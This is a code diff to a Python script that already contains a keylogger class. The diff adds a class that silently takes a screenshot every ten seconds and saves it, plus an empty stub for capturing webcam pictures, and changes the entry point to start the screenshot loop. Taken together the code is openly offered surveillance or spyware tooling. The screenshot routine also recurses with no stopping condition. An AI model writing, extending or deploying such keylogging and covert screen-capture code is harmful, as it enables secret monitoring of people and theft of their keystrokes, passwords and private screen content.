@@ -1,7 +1,10 @@
 #!/bin/python
 
+import os
 import datetime
+import time
 from pynput import keyboard
+import pyautogui
 
 
 class Keylogger:
@@ -31,5 +34,29 @@ class Keylogger:
             self.last_time = int(datetime.datetime.now().strftime('%S'))
 
 
+class ScreenshotTaker:
+    def __init__(self):
+        self.number_of_screenshots = 0
+        self.take_and_save_screenshot()
+
+    def take_and_save_screenshot(self):
+        """
+        take a screenshot every 10 seconds and save it in the current working directory
+        """
+        screenshot = pyautogui.screenshot()
+        screenshot.save(f'{os.getcwd()}/screenshot{self.number_of_screenshots}.png')
+        time.sleep(10)
+        self.number_of_screenshots += 1
+        self.take_and_save_screenshot()
+
+
+class WebcamPictureTaker:
+    def __init__(self):
+        pass
+
+    def take_webcam_picture(self):
+        pass
+
+
 if __name__ == '__main__':
-    test = Keylogger()
+    test = ScreenshotTaker()
